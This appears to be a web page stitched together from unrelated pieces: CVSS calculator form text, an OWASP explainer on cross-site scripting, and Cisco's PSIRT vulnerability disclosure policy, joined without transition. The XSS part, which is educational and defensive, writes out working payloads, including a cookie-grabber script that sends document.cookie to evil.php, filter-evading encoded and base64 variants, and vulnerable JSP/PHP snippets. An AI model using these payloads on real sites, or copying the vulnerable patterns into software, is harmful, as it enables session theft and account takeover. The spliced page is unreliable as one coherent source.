| Base Parameters |
| Once discovered, analyzed, and catalogued, there are certain aspects of a vulnerability that do not change, assuming the initial information is complete and correct. These immutable characteristics will not change over time, nor in different environments. The base metric group captures the access to and impact on the target.  Attack Vector AV: Local AV: Adjacent AV: Network AV: Physical  Select Attack Vector Parameters  Attack Complexity AC: Low AC: High  Select Attack Complexity Parameters  Privileges Required PR: None PR: Low PR: High  Select Privileges Required Parameters  User Interaction UI: Required UI: None  Select User Interaction Parameters  Scope S: Unchanged S: Changed  Select Scope Parameters  Confidentiality Impact C: Low C: High C: None  Select Confidentiality Impact Parameters  Integrity Impact I: None I: Low I: High  Select Integrity Impact Parameters  Availability Impact A: Low A: High A: None  Select Availability Impact Parameters    Base Score: 6.1 |
| Temporal Parameters |
| As a vulnerability ages, certain intrinsic characteristics will change with time. In many cases, when a vulnerability is first discovered, the number of vulnerable systems will be at or close to its peak, while the availability of exploit and remedial information will be at its lowest point. As time progresses, patch information will become more available and more systems will be fixed as more exploits occur, driving the need for the fix. Eventually, the number of vulnerable systems will reach its low point as remedial information reaches its high point. The CVSS temporal metrics group captures these characteristics of a vulnerability that change over time.  Exploit Code Maturity E: Functional  E: High  E: Not Defined  E: Proof-of-Concept  E: Unproven   Select Exploit Code Maturity Parameters  Remediation Level RL: Official-Fix  RL: Temporary-Fix  RL: Workaround  RL: Unavailable  RL: Not Defined   Select Remediation Level Parameters  Report Confidence RC: Unknown  RC: Reasonable  RC: Not Defined  RC: Confirmed   Select Report Confidence Parameters     Temporal Score: 6.1 |
| Environmental Parameters |
| Different user environments can have an immense bearing on how (or if) a vulnerability affects a given information system and its stakeholders. The CVSS environmental metrics group captures characteristics of vulnerabilities that are tied to system distribution and network environment.  Confidentiality Requirement CR: Low  CR: Medium  CR: High  CR: Not Defined   Select Confidentiality Requirement Parameters  Integrity Requirement IR: Not Defined  IR: Low  IR: Medium  IR: High   Select Integrity Requirement Parameters  Availability Requirement AR: Low  AR: Medium  AR: High  AR: Not Defined   Select Availability Requirement Parameters  Modified Attack Vector MAV: Local  MAV: Adjacent  MAV: Network  MAV: Physical  MAV: Not Defined   Select Modified Attack Vector Parameters  Modified Attack Complexity MAC: Low  MAC: High  MAC: Not Defined   Select Modified Attack Complexity Parameters  Modified Privileges Required MPR: None  MPR: Low  MPR: High  MPR: Not Defined   Select Modified Privileges Required Parameters  Modified User Interaction MUI: Required  MUI: None  MUI: Not Defined   Select Modified User Interaction Parameters  Modified Scope MS: Unchanged  MS: Changed  MS: Not Defined   Select Modified Scope Parameters  Modified Confidentiality MC: None  MC: Low  MC: High  MC: Not Defined   Select Modified Confidentiality Parameters  Modified Integrity MI: None  MI: Low  MI: High  MI: Not Defined   Select Modified Integrity Parameters  Modified Availability MA: None  MA: Low  MA: High  MA: Not Defined   Select Modified Availability Parameters    Environmental Score: 6.1 |

# Cross Site Scripting (XSS)

## Overview

Cross-Site Scripting (XSS) attacks are a type of injection, in which
malicious scripts are injected into otherwise benign and trusted
websites. XSS attacks occur when an attacker uses a web application to
send malicious code, generally in the form of a browser side script, to
a different end user. Flaws that allow these attacks to succeed are
quite widespread and occur anywhere a web application uses input from a
user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting
user. The end user’s browser has no way to know that the script should
not be trusted, and will execute the script. Because it thinks the
script came from a trusted source, the malicious script can access any
cookies, session tokens, or other sensitive information retained by the
browser and used with that site. These scripts can even rewrite the
content of the HTML page. For more details on the different types of XSS
flaws, see: [Types of Cross-Site Scripting](../../Types_of_Cross-Site_Scripting).

## Description

Cross-Site Scripting (XSS) attacks occur when:

1. Data enters a Web application through an untrusted source, most frequently a web request.
2. The data is included in dynamic content that is sent to a web user without being validated for malicious content.

The malicious content sent to the web browser often takes the form of a
segment of JavaScript, but may also include HTML, Flash, or any other
type of code that the browser may execute. The variety of attacks based
on XSS is almost limitless, but they commonly include transmitting
private data, like cookies or other session information, to the
attacker, redirecting the victim to web content controlled by the
attacker, or performing other malicious operations on the user’s machine
under the guise of the vulnerable site.

### Reflected and Stored XSS Attacks

XSS attacks can generally be categorized into two categories: reflected
and stored. There is a third, much less well-known type of XSS attack
called [DOM Based XSS](../DOM_Based_XSS) that is discussed
separately [here](../DOM_Based_XSS).

#### Reflected XSS Attacks

Reflected attacks are those where the injected script is reflected off
the web server, such as in an error message, search result, or any other
response that includes some or all of the input sent to the server as
part of the request. Reflected attacks are delivered to victims via
another route, such as in an e-mail message, or on some other website.
When a user is tricked into clicking on a malicious link, submitting a
specially crafted form, or even just browsing to a malicious site, the
injected code travels to the vulnerable web site, which reflects the
attack back to the user’s browser. The browser then executes the code
because it came from a “trusted” server. Reflected XSS is also sometimes
referred to as Non-Persistent or Type-I XSS (the attack is carried out
through a single request / response cycle).

#### Stored XSS Attacks

Stored attacks are those where the injected script is permanently stored
on the target servers, such as in a database, in a message forum,
visitor log, comment field, etc. The victim then retrieves the malicious
script from the server when it requests the stored information. Stored
XSS is also sometimes referred to as Persistent or Type-II XSS.

#### Blind Cross-site Scripting

Blind Cross-site Scripting is a form of persistent XSS. It generally occurs when the attacker’s payload saved on the server and reflected back to the victim from the backend application. For example in feedback forms, an attacker can submit the malicious payload using the form, and once the backend user/admin of the application will open the attacker’s submitted form via the backend application, the attacker’s payload will get executed.
Blind Cross-site Scripting is hard to confirm in the real-world scenario but one of the best tools for this is XSS Hunter.

### Other Types of XSS Vulnerabilities

In addition to Stored and Reflected XSS, another type of XSS, [DOM Based
XSS](../DOM_Based_XSS) was identified by [Amit Klein
in 2005](http://www.webappsec.org/projects/articles/071105.shtml). OWASP
recommends the XSS categorization as described in the OWASP Article:
[Types of Cross-Site Scripting](../../Types_of_Cross-Site_Scripting), which covers all
these XSS terms, organizing them into a matrix of Stored vs. Reflected
XSS and Server vs. Client XSS, where DOM Based XSS is a subset of Client
XSS.

#### XSS Attack Consequences

The consequence of an XSS attack is the same regardless of whether it is
stored or reflected ([or DOM Based](../DOM_Based_XSS)). The
difference is in how the payload arrives at the server. Do not be fooled
into thinking that a “read-only” or “brochureware” site is not
vulnerable to serious reflected XSS attacks. XSS can cause a variety of
problems for the end user that range in severity from an annoyance to
complete account compromise. The most severe XSS attacks involve
disclosure of the user’s session cookie, allowing an attacker to hijack
the user’s session and take over the account. Other damaging attacks
include the disclosure of end user files, installation of Trojan horse
programs, redirecting the user to some other page or site, or modifying
presentation of content. An XSS vulnerability allowing an attacker to
modify a press release or news item could affect a company’s stock price
or lessen consumer confidence. An XSS vulnerability on a pharmaceutical
site could allow an attacker to modify dosage information resulting in
an overdose. For more information on these types of attacks see
[Content\_Spoofing](../Content_Spoofing).

### How to Determine If You Are Vulnerable

XSS flaws can be difficult to identify and remove from a web
application. The best way to find flaws is to perform a security review
of the code and search for all places where input from an HTTP request
could possibly make its way into the HTML output. Note that a variety of
different HTML tags can be used to transmit a malicious JavaScript.
Nessus, Nikto, and some other available tools can help scan a website
for these flaws, but can only scratch the surface. If one part of a
website is vulnerable, there is a high likelihood that there are other
problems as well.

### How to Protect Yourself

The primary defenses against XSS are described in the [OWASP XSS Prevention Cheat
Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

Also, it’s crucial that you turn off HTTP TRACE support on all web
servers. An attacker can steal cookie data via Javascript even when
document.cookie is disabled or not supported by the client. This attack
is mounted when a user posts a malicious script to a forum so when
another user clicks the link, an asynchronous HTTP Trace call is
triggered which collects the user’s cookie information from the server,
and then sends it over to another malicious server that collects the
cookie information so the attacker can mount a session hijack attack.
This is easily mitigated by removing support for HTTP TRACE on all web
servers.

The [OWASP ESAPI project](https://www.owasp.org/www-project-enterprise-security-api) has produced a set of
reusable security components in several languages, including validation
and escaping routines to prevent parameter tampering and the injection
of XSS attacks. In addition, the [OWASP WebGoat Project](https://www.owasp.org/www-project-webgoat/) training
application has lessons on Cross-Site Scripting and data encoding.

### Alternate XSS Syntax

#### XSS Using Script in Attributes

XSS attacks may be conducted without using `<script>...</script>`
tags. Other tags will do exactly the same thing, for example:
`<body onload=alert('test1')>` or other attributes like: `onmouseover`, `onerror`.

##### onmouseover

`<b onmouseover=alert('Wufff!')>click me!</b>`

##### onerror

`<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>`

#### XSS Using Script Via Encoded URI Schemes

If we need to hide against web application filters we may try to encode
string characters, e.g.: `a=&\#X41` (UTF-8) and use it in `IMG` tags:

`<IMG SRC=j&#X41vascript:alert('test2')>`

There are many different UTF-8 encoding notations that give us even more
possibilities.

#### XSS Using Code Encoding

We may encode our script in base64 and place it in `META` tag. This way we
get rid of `alert()` totally. More information about this method can be
found in RFC 2397

```
<META HTTP-EQUIV="refresh"
CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">

```

These and others examples can be found at the OWASP [XSS Filter Evasion Cheat Sheet](../../xss-filter-evasion-cheatsheet) which is a true
encyclopedia of the alternate XSS syntax attack.

## Examples

Cross-site scripting attacks may occur anywhere that possibly malicious
users are allowed to post unregulated material to a trusted website for
the consumption of other valid users.

The most common example can be found in bulletin-board websites which
provide web based mailing list-style functionality.

### Example 1

The following JSP code segment reads an employee ID, eid, from an HTTP
request and displays it to the user.

```
<% String eid = request.getParameter("eid"); %>
...
Employee ID: <%= eid %>

```

The code in this example operates correctly if `eid` contains only
standard alphanumeric text. If `eid` has a value that includes
meta-characters or source code, then the code will be executed by the
web browser as it displays the HTTP response.

Initially, this might not appear to be much of a vulnerability. After
all, why would someone enter a URL that causes malicious code to run on
their own computer? The real danger is that an attacker will create the
malicious URL, then use e-mail or social engineering tricks to lure
victims into visiting a link to the URL. When victims click the link,
they unwittingly reflect the malicious content through the vulnerable
web application back to their own computers. This mechanism of
exploiting vulnerable web applications is known as Reflected XSS.

### Example 2

The following JSP code segment queries a database for an employee with a
given ID and prints the corresponding employee’s name.

```
<%...
 Statement stmt = conn.createStatement();
 ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
 if (rs != null) {
  rs.next();
  String name = rs.getString("name");
%>

Employee Name: <%= name %>

```

As in Example 1, this code functions correctly when the values of name
are well-behaved, but it does nothing to prevent exploits if they are
not. Again, this code can appear less dangerous because the value of
name is read from a database, whose contents are apparently managed by
the application. However, if the value of name originates from
user-supplied data, then the database can be a conduit for malicious
content. Without proper input validation on all data stored in the
database, an attacker can execute malicious commands in the user’s web
browser. This type of exploit, known as Stored XSS, is particularly
insidious because the indirection caused by the data store makes it more
difficult to identify the threat and increases the possibility that the
attack will affect multiple users. XSS got its start in this form with
websites that offered a “guestbook” to visitors. Attackers would include
JavaScript in their guestbook entries, and all subsequent visitors to
the guestbook page would execute the malicious code.

As the examples demonstrate, XSS vulnerabilities are caused by code that
includes unvalidated data in an HTTP response. There are three vectors
by which an XSS attack can reach a victim:

* As in Example 1, data is read directly from the HTTP request and
  reflected back in the HTTP response. Reflected XSS exploits occur
  when an attacker causes a user to supply dangerous content to a
  vulnerable web application, which is then reflected back to the user
  and executed by the web browser. The most common mechanism for
  delivering malicious content is to include it as a parameter in a
  URL that is posted publicly or e-mailed directly to victims. URLs
  constructed in this manner constitute the core of many phishing
  schemes, whereby an attacker convinces victims to visit a URL that
  refers to a vulnerable site. After the site reflects the attacker’s
  content back to the user, the content is executed and proceeds to
  transfer private information, such as cookies that may include
  session information, from the user’s machine to the attacker or
  perform other nefarious activities.
* As in Example 2, the application stores dangerous data in a database
  or other trusted data store. The dangerous data is subsequently read
  back into the application and included in dynamic content. Stored
  XSS exploits occur when an attacker injects dangerous content into a
  data store that is later read and included in dynamic content. From
  an attacker’s perspective, the optimal place to inject malicious
  content is in an area that is displayed to either many users or
  particularly interesting users. Interesting users typically have
  elevated privileges in the application or interact with sensitive
  data that is valuable to the attacker. If one of these users
  executes malicious content, the attacker may be able to perform
  privileged operations on behalf of the user or gain access to
  sensitive data belonging to the user.
* A source outside the application stores dangerous data in a database
  or other data store, and the dangerous data is subsequently read
  back into the application as trusted data and included in dynamic
  content.

### Attack Examples

**Example 1: Cookie Grabber**

If the application doesn’t validate the input data, the attacker can
easily steal a cookie from an authenticated user. All the attacker has
to do is to place the following code in any posted input(ie: message
boards, private messages, user profiles):

```
<SCRIPT type="text/javascript">
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
</SCRIPT>

```

The above code will pass an escaped content of the cookie (according to
RFC content must be escaped before sending it via HTTP protocol with GET
method) to the evil.php script in “cakemonster” variable. The attacker
then checks the results of their evil.php script (a cookie grabber script
will usually write the cookie to a file) and use it.

### Error Page Example

Let’s assume that we have an error page, which is handling requests for
a non existing pages, a classic 404 error page. We may use the code
below as an example to inform user about what specific page is missing:

```
<html>
<body>
<?php
print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
?>

</body>
</html>

```

Let’s see how it works: `http://testsite.test/file_which_not_exist`
In response we get: `Not found: /file_which_not_exist`

Now we will try to force the error page to include our code: `http://testsite.test/<script>alert("TEST");</script>`
The result is: `Not found: / (but with JavaScript code <script>alert("TEST");</script>)`

We have successfully injected the code, our XSS! What does it mean? For
example, that we may use this flaw to try to steal a user’s session
cookie.

## Purpose

This policy was created to guide and inform Cisco customers in the event of a reported vulnerability in a Cisco product or cloud-hosted service. It ensures that Cisco customers have a consistent, unambiguous resource to help them understand how Cisco responds to events of this nature.

## Policy

This policy clearly states how Cisco addresses reported security vulnerabilities in Cisco products and cloud-hosted services, including the timeline, actions, and responsibilities that apply to all customers.

## Cisco Product Security Incident Response

The Cisco Product Security Incident Response Team (PSIRT) is responsible for responding to Cisco product security incidents. The Cisco PSIRT is a dedicated, global team that manages the receipt, investigation, and public reporting of information about security vulnerabilities and issues related to Cisco products and services. Cisco defines a security vulnerability as a weakness in the computational logic (e.g., code) found in software and hardware components that, when exploited, results in a negative impact to confidentiality, integrity, or availability. Cisco reserves the right to deviate from this definition based on specific circumstances. The Cisco PSIRT adheres to ISO/IEC 29147:2018, which are [guidelines for disclosure of potential vulnerabilities](https://www.iso.org/standard/72311.html) established by the International Organization for Standardization.

The on-call Cisco PSIRT works 24 hours a day with Cisco customers, independent security researchers, consultants, industry organizations, and other vendors to identify possible security vulnerabilities and issues with Cisco products and networks.

## Reporting or Obtaining Support for a Suspected Security Vulnerability

Individuals or organizations that are experiencing a product security issue are strongly encouraged to contact the Cisco PSIRT. Cisco welcomes reports from independent researchers, industry organizations, vendors, customers, and other sources concerned with product or network security. At minimum, a description of the potential vulnerability is needed to report a security issue.

To contact the Cisco PSIRT, use one of the following methods:

*Primary approach:* The most effective method for reaching the Cisco PSIRT is sending an email to psirt@cisco.com. In the email, provide a detailed problem description and any relevant details and logs.

Alternatively, the Cisco PSIRT may be contacted using the following phone numbers:

* +1 877 228 7302 (toll-free within North America)
* +1 408 525 6532 (international direct dial)

These contact numbers route to Cisco global customer support. To facilitate engagement, please explain that this is a product security issue or, alternatively, reference the PSIRT-SVP-001 search code.

Cisco encourages customers to encrypt sensitive information that is sent to Cisco by email. The Cisco PSIRT supports encrypted messages via Pretty Good Privacy (PGP)/GNU Privacy Guard (GPG) encryption software. The Cisco PSIRT public key is available at the following link: <https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc>.

**Note:** Cisco supports an RFC 9116-compliant security.txt file, located at <https://www.cisco.com/.well-known/security.txt>.

## General Security-Related Queries

For general security concerns about Cisco products and cloud-hosted services, the Cisco Technical Assistance Center (TAC) can provide configuration and technical assistance. The Cisco TAC can also help with nonsensitive security incidents and software upgrades for security bug fixes. To contact the Cisco TAC, use one of the following methods:

### **Cisco.com**

The [Cisco Security portal](https://www.cisco.com/security) on Cisco.com provides Cisco security vulnerability documents and Cisco security information, including relevant security products and services.

For direct links to specific security functions, see the [Types of Security Publications](#tosp) section of this
document.

### **Email**

Cisco Security Advisories provide information about Critical-, High-, and Medium-severity security vulnerabilities. They are clear signed with the Cisco PSIRT [PGP public key](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc) and distributed to the external cust-security-announce@cisco.com mailing list. The Cisco PSIRT may also send Informational advisories to the cust-security-announce mailing list. Informational advisories are used not as a disclosure mechanism for any Cisco vulnerabilities but for sharing information on security incidents that may impact Cisco products and that may be of interest to Cisco customers.

Emails are sent for the initial release of and major revisions to Cisco Security Advisories. A major revision is defined as a significant change to advisory content that could result in the customer addressing the vulnerability differently. Examples of a major advisory change include, but are not limited to, changes to the affected products list, changes in Security Impact Rating (SIR; see the [Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating](#asr) section of this document), and changes in mitigation and/or fix information. If a document undergoes a minor revision, the update will be posted to Cisco.com without an accompanying email. Customers that require automated alerts for minor revisions should subscribe to the Cisco Security Advisory Really Simple Syndication (RSS) feed or My Notifications. All Security Advisories on Cisco.com are displayed in chronological order, with the most recent advisories and updates appearing at the top of the page.

To subscribe to the cust-security-announce mailing list, email cust-security-announce-join@cisco.com. (The content of the message does not matter.) You will receive confirmation, instructions, and a list policy statement.

Please note that requests must be sent to cust-security-announce-join@cisco.com and not to the cust-security-announce@cisco.com list itself.

To unsubscribe from the cust-security-announce mailing list, email cust-security-announce-leave@cisco.com with the word "unsubscribe" in the subject line. (The content of the message does not matter.) You will receive a confirmation notice, to which you need to reply to be unsubscribed. You will not be unsubscribed unless you reply to the confirmation email.

Please note that requests to subscribe must be sent to cust-security-announce-join@cisco.com, and requests to unsubscribe must be sent to cust-security-announce-leave@cisco.com—not to the cust-security-announce@cisco.com email address itself.

You must send the messages from the account that you want to be subscribed to or unsubscribed from the list.

Customers can also request to be subscribed or unsubscribed to the cust-security-announce mailing list by emailing psirt@cisco.com.

### **RSS Feeds**

Cisco security vulnerability information is also available via RSS feeds from Cisco.com. These feeds are free and do not require an active Cisco.com registration. For information on how to subscribe to the RSS feeds, visit the [Cisco Security RSS Feeds page](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44).

### **Cisco PSIRT openVuln API**

The Cisco PSIRT openVuln application programming interface (API) is a RESTful API that conforms to the [representational state transfer](https://restfulapi.net/) (REST) software architectural style and allows customers to obtain Cisco security vulnerability information in different machine-consumable formats. To learn about accessing and using the API, visit the [PSIRT page](https://developer.cisco.com/site/PSIRT) on the Cisco DevNet website.

### **My Notifications**

| **Additional Public Relations** | media\_pr@cisco.com |

## Commitment to Product Security and Integrity at Cisco

Cisco product development practices specifically prohibit any intentional behaviors or product features that are designed to allow unauthorized device or network access, exposure of sensitive device information, or a bypass of security features or restrictions. These include, but are not limited to:

* Undisclosed device access methods or "back doors"
* Hardcoded or undocumented account credentials
* Covert communication channels
* Undocumented traffic diversion

Cisco considers such product behaviors to be serious vulnerabilities. Cisco will address any issues of this nature with the highest priority and encourages all parties to report suspected vulnerabilities to the Cisco PSIRT for immediate investigation. Internal and external reports of these vulnerabilities will be managed and disclosed in accordance with the terms of the Cisco Security Vulnerability Policy.

More information can be found on the [Cisco Secure Development Lifecycle (CSDL) website](https://www.cisco.com/c/en/us/about/trust-center/technology-built-in-security.html#~stickynav=2).

## Cisco Product Security Incident Response Process

Figure 1 illustrates the vulnerability life cycle and the Cisco PSIRT disclosure and resolution process at a high level.

**Figure 1.** Cisco Product Security Incident Response Process

![response process cycle from awareness to feedback](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/public/files/images/white_papers/psirtprocess.jpg "Cisco Product Security Incident Response Process")

The steps in the process illustrated in Figure 1 are as follows:

1. **Awareness:** PSIRT receives notification of a security incident.
2. **Active Management:** PSIRT prioritizes and identifies resources.
3. **Software Fixes:** PSIRT coordinates the fix and impact assessment.
4. **Customer Notification:** PSIRT notifies all customers simultaneously.

The Cisco PSIRT investigates all reports regardless of the Cisco software code version or product life cycle status until the product reaches the [Last Day of Support](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (LDoS). Issues will be prioritized based on the potential severity of the vulnerability and other environmental factors. Ultimately, the resolution of a reported incident may require upgrades to products and cloud-hosted services that are under active support from Cisco. As a best practice, Cisco strongly recommends that customers periodically verify that their products are under active support for access to the latest software updates and other benefits.

Throughout the investigative process, the Cisco PSIRT strives to work collaboratively with the source of the report (incident reporter) to confirm the nature of the vulnerability, gather required technical information, and ascertain appropriate remedial action. When the initial investigation is complete, results will be delivered to the incident reporter along with a plan for resolution and public disclosure. If the incident reporter disagrees with the conclusion, the Cisco PSIRT will make every effort to address those concerns.

In the case of incidents about which an agreement cannot be reached through the normal process, incident reporters may escalate by contacting the [Cisco TAC](#gsrq) and requesting the director of the global Cisco PSIRT team.

During any investigation, the Cisco PSIRT manages all sensitive information on a highly confidential basis. Internal distribution is limited to those individuals who have a legitimate need to know and can actively assist in the resolution. Similarly, the Cisco PSIRT asks incident reporters to maintain strict confidentiality until complete resolutions are available for customers and have been published by the Cisco PSIRT on the Cisco website through the appropriate coordinated disclosure.

With the agreement of the incident reporter, the Cisco PSIRT may acknowledge the reporter's contribution during the public disclosure of the vulnerability.

The Cisco PSIRT works with third-party coordination centers such as the [Computer Emergency Response Team Coordination Center](https://www.kb.cert.org/vuls/) (CERT/CC), [Computer Emergency Response Team of Finland](https://www.kyberturvallisuuskeskus.fi/en/) (CERT-FI), [Japan Computer Emergency Response Team](https://www.jpcert.or.jp/english/) (JP-CERT), and [National Protective Security Authority](https://www.npsa.gov.uk) (NPSA) to manage a coordinated industry disclosure for vulnerabilities reported to Cisco that may impact multiple vendors (for example, a generic protocol issue). In these situations, the Cisco PSIRT will either assist the incident reporter with contacting the coordination center or do so on the incident reporters behalf.

If a reported vulnerability involves a vendor product, the Cisco PSIRT will notify the vendor directly, coordinate with the incident reporter, or engage a third-party coordination center.

The Cisco PSIRT will coordinate with the incident reporter to determine the frequency of status updates on the incident and documentation updates.

In the event that Cisco becomes aware of a vulnerability that does not affect a Cisco product but does involve another vendor's product, Cisco will follow the Cisco [policy for reporting vulnerabilities to vendors](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html).

## Disclosure of Security Vulnerabilities Discovered as Part of Cisco Services Delivery

If a new or previously undisclosed security vulnerability is found during a Cisco Services engagement with a customer, Cisco will follow the [Cisco Product Security Incident Response Process](#cpsirp). Vulnerabilities found in Cisco products and cloud-hosted services will be handled by the Cisco PSIRT according to the [Cisco Security Vulnerability Policy](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html). If the vulnerability is in another vendors product, Cisco will follow the [Cisco Vendor Vulnerability Reporting and Disclosure Policy](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html) unless the affected customer wishes to report the vulnerability to the vendor directly; in that case, Cisco will facilitate contact between the customer and the vendor, and will notify CERT/CC (or its national equivalent).

Cisco will protect customer-specific data at all times throughout this process. Specifically, Cisco will not share any customer-specific data unless directed to do so by the affected customer, or as required by a legal investigation.

### **Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating**

Cisco uses [Version 3.1](https://www.first.org/cvss/v3-1/) of the [Common Vulnerability Scoring System](https://www.first.org/cvss/) (CVSS) as part of its standard process of evaluating reported potential vulnerabilities that do not have a CVE in Cisco products and cloud-hosted services. The CVSS model uses three distinct measurements, or scores, that include Base, Temporal, and Environmental calculations. Cisco will provide an evaluation of the Base vulnerability score and, in some instances, the Temporal vulnerability score. End users are encouraged to compute the Environmental score based on their network parameters. The combination of all three scores should be considered the final score, which represents a moment in time and is tailored to a specific environment. Organizations are advised to use this final score to prioritize responses in their own environments.

**Note:** Cisco began transitioning to CVSS Version 3.1 (CVSSv3.1) in May 2020.

In addition to CVSS scores, Cisco uses the Security Impact Rating (SIR) as a way to categorize vulnerability severity in a simpler manner. The SIR is based on the CVSS Qualitative Severity Rating Scale of the Base score, may be adjusted by PSIRT to account for Cisco-specific variables, and is included in every Cisco Security Advisory. Cisco uses the following guidelines to determine the Cisco Security Advisory type for vulnerabilities in Cisco-authored, customer-managed software. Security Advisories for Critical, High, and Medium SIRs include fixed software information.

| **Publication** | **Type** | **CVSS** | **CVE** | **Fix Information** | **Machine-Readable Format** |
| --- | --- | --- | --- | --- | --- |
| Cisco Security Advisory | Critical | 9.0–10.0 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, Adaptive Security Appliance (ASA), Firepower Threat Defense (FTD), and Firepower Management Center (FMC) Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| High | 7.0–8.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Medium | 4.0–6.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Informational | N/A | No | Fix information in bug (if applicable). | [RSS](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |

Issues with a Low SIR are typically published as a bug Release Note Enclosure (RNE) and not as a Security Advisory.

Cisco reserves the right to deviate from these guidelines in specific cases if additional factors are not properly captured in the CVSS score.

If there is a security issue with a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the third party. In some cases, Cisco may adjust the CVSS score to reflect the impact to the Cisco product.

**Note:** Cisco is a [Common Vulnerabilities and Exposures](https://cve.mitre.org/index.html) (CVE) Numbering Authority and will assign CVE IDs to Cisco software vulnerabilities from the MITRE block of IDs assigned to the company for this purpose. Cisco does not assign CVE IDs for reported vulnerabilities until the vulnerabilities have been confirmed by Cisco. After vulnerabilities are published, Cisco provides CVE details to MITRE for inclusion in its database.

For more information about CVSS, visit [FIRST.org](https://www.first.org/cvss/).
### **Cisco Cloud-Hosted Services**

Cisco offers multiple cloud-hosted services that are used by customers but are maintained, patched, and monitored by Cisco.

The Cisco PSIRT responds to vulnerabilities in Cisco cloud-hosted services and works closely with the teams that operate them. These teams ensure that security vulnerabilities are fixed and patches are deployed to all customer instances in a timely manner.

Typically, service-related security events are communicated to customers by the service teams through direct notification or through the service dashboard or portal. In some instances, Cisco may disclose vulnerabilities through Security Advisories for Cisco cloud-hosted services in coordination with the service teams.

In most cases, no user action is required because Cisco regularly patches cloud-hosted services.

### **Third-Party Software Vulnerabilities**

If there is a vulnerability in a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the component creator. Cisco may adjust the CVSS score to reflect the impact to Cisco products.

Cisco will consider a third-party vulnerability “high profile” if it meets the following criteria:

* The vulnerability exists in a third-party component.
* Multiple Cisco products and/or cloud-hosted services are affected.
* The CVSS score is 5.0 or above.
* The vulnerability has gathered significant public attention.
* The vulnerability is likely to have exploits available and is expected to be, or is being, actively exploited.

For high profile, third-party vulnerabilities, Cisco will begin assessing all potentially impacted products and cloud-hosted services that have not reached the LDoS and publish a Security Advisory within 24 hours after Cisco classifies the vulnerability as high profile. All known affected Cisco products and cloud-hosted services will be detailed in an update to the initial Security Advisory that will be published within 7 days of the initial disclosure. A Cisco bug will be created for each vulnerable product so that registered customers can view them using the Cisco Bug Search Toolkit. Third-party vulnerabilities that are not classified as high profile will be disclosed in a Release Note Enclosure.

### **Cisco Vulnerability Repository**

The [Cisco Vulnerability Repository](https://sec.cloudapps.cisco.com/security/center/cvr) (CVR) is a vulnerability search engine for CVEs reported after 2017 that may impact Cisco products. CVR can help customers understand if their Cisco product is affected by a particular third-party software vulnerability. This tool also displays any Cisco Security Advisories associated with a CVE. At this time, CVR does not include Cisco cloud offers. For help with a product not listed in this tool, please use the Feedback link on the [CVR page](https://sec.cloudapps.cisco.com/security/center/cvr) or contact your support organization.

### **Vulnerability Exploitability eXchange**

Customers may request a Vulnerability Exploitability eXchange (VEX) document for any CVE in CVR.

### **Types of Security Publications**

In all security publications, Cisco discloses the information required for an end user to assess the impact of a vulnerability and any potential steps needed to protect their environment. Cisco does not provide vulnerability details that could enable someone to craft an exploit. Cisco Security Advisories are point-in-time documents. Information should only be considered up to date as of the time and date of the last publication update as indicated by the "Last Updated" field in the advisory header.

Cisco provides the following types of security-related publications via the [Cisco Security portal](https://www.cisco.com/security) on Cisco.com.

### Cisco Security Advisories

[Cisco Security Advisories](https://sec.cloudapps.cisco.com/security/center/publicationListing.x) provide detailed information about security issues that directly involve Cisco products and cloud-hosted services and require an upgrade, fix, or other customer action. Security Advisories are used to disclose vulnerabilities in Cisco-authored software or in high-profile third-party software with a Critical, High, or Medium SIR. The Cisco PSIRT only validates the affected and fixed version information documented in the advisory.

All Cisco Security Advisories that disclose vulnerabilities with a Critical, High, or Medium SIR include an option to download [Common Security Advisory Framework (CSAF)](https://csaf.io/) content. CSAF is an industry standard designed to depict vulnerability information in machine-readable format. This machine-readable content can be used with other tools to automate the process of interpreting data contained in a Security Advisory. CSAF content can be downloaded directly from each Security Advisory. For more information about CSAF, see the preceding link.

The Informational type of Cisco Security Advisories addresses issues that require a response to information discussed in a public forum, such as a blog or discussion list. Informational advisories are normally published if a third party makes a public statement about a Cisco product vulnerability. Informational advisories may also be used to proactively notify customers about a security-related issue that is not a vulnerability.

### Cisco Event Responses

Cisco [Event Responses](https://sec.cloudapps.cisco.com/security/center/erp.x?i=52) provide information about security events that have the potential for widespread impact on customer networks, applications, and devices. Cisco Event Responses contain summary information, threat analysis, and mitigation techniques that feature Cisco products and cloud-hosted services. They are normally published under the following circumstances:

* If a significant security vulnerability exists in a vendor's product that could affect a Cisco product due to interoperation with the vendor's product or use of the network as a vector for exploitation
